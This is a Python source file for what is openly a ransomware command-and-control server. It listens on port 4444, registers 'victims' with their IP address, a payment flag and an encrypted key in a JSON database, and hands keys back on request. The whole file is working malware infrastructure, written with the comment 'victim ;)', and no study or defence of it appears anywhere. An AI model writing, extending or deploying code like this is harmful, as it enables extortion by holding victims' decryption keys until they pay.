import socket
import os
import json
from datetime import datetime

# Configuration
HOST = "0.0.0.0"
PORT = 4444
SAVE_DIR = "victim_data"

# Create directory for storing victim data
os.makedirs(SAVE_DIR, exist_ok=True)

# Database file (simple JSON)
DB_FILE = os.path.join(SAVE_DIR, "victims.json")

# Load existing database
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

# Save database
def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=2)

try:
    # Create socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[+] Socket created successfully")

    # Bind to address and port
    server_socket.bind((HOST, PORT))
    print(f"[+] Bound to {HOST}:{PORT}")

    # Start listening
    server_socket.listen(5)
    print(f"[+] Listening for incoming connections...\n")

    db = load_db()

    while True:
        # Accept client connection
        client_conn, client_addr = server_socket.accept()
        print(f"[+] Connection accepted from {client_addr[0]}:{client_addr[1]}")

        try:
            # Receive data from client (victim ;))
            data = client_conn.recv(4096)
            if not data:
                print("[-] No data received")
                client_conn.close()
                continue

            # Parse the received data
            data_str = data.decode('utf-8').strip()
            print(f"[+] Received: {data_str}")

            # ===== HANDLE KEY REQUESTS =====
            if data_str.startswith("GET_KEY:"):
                victim_id = data_str.replace("GET_KEY:", "")
                print(f"[+] Key request for victim: {victim_id}")
                
                # Look up victim in database
                if victim_id in db:
                    # Return the encrypted key
                    client_conn.send(db[victim_id]["encrypted_key"].encode())
                    print(f"[+] Key sent to {victim_id}")
                else:
                    client_conn.send(b"ERROR: Victim not found")
                    print(f"[-] Victim {victim_id} not found in database")
                
                client_conn.close()
                print(f"[+] Connection closed with {client_addr[0]}\n")
                continue

            # ===== HANDLE VICTIM REGISTRATION =====
            # Format: "victim_id:isPaid:encrypted_key_hex"
            parts = data_str.split(':', 2)
            
            if len(parts) != 3:
                print("[-] Invalid data format")
                client_conn.send(b"ERROR: Invalid format. Expected: victim_id:isPaid:key")
                client_conn.close()
                continue

            victim_id, isPaid_str, encrypted_key_hex = parts

            # Validate isPaid
            if isPaid_str.lower() not in ["true", "false", "0", "1"]:
                print("[-] Invalid isPaid value")
                client_conn.send(b"ERROR: Invalid isPaid format")
                client_conn.close()
                continue

            # Store as boolean
            isPaid = isPaid_str.lower() in ["true", "1"]

            # Validate hex key
            try:
                # Just validate it's proper hex, don't decode yet
                bytes.fromhex(encrypted_key_hex)
            except ValueError:
                print("[-] Invalid hex key format")
                client_conn.send(b"ERROR: Invalid key format (not valid hex)")
                client_conn.close()
                continue

            # Store victim data
            victim_data = {
                "victim_id": victim_id,
                "isPaid": isPaid,
                "encrypted_key": encrypted_key_hex,
                "ip": client_addr[0],
                "timestamp": datetime.now().isoformat(),
                "files_encrypted": None,  # Could add later
                "folders_processed": None  # Could add later
            }

            # Update database
            if victim_id not in db:
                db[victim_id] = victim_data
                print(f"[+] New victim registered: {victim_id}")
            else:
                # Update existing record (keep isPaid as false initially)
                db[victim_id].update(victim_data)
                print(f"[+] Victim data updated: {victim_id}")

            save_db(db)

            print(f"[+] Key saved for victim {victim_id} (isPaid: {isPaid})")
            
            # Send confirmation
            client_conn.send(f"OK: Victim {victim_id} registered".encode())

        except Exception as e:
            print(f"[-] Error handling client: {e}")
            try:
                client_conn.send(f"ERROR: {str(e)}".encode()[:100])
            except:
                pass
        
        finally:
            client_conn.close()
            print(f"[+] Connection closed with {client_addr[0]}\n")

except KeyboardInterrupt:
    print("\n[!] Server stopped by user")
    save_db(db)

except Exception as e:
    print(f"[-] Server error: {e}")

finally:
    server_socket.close()
    print("[+] Server socket closed")
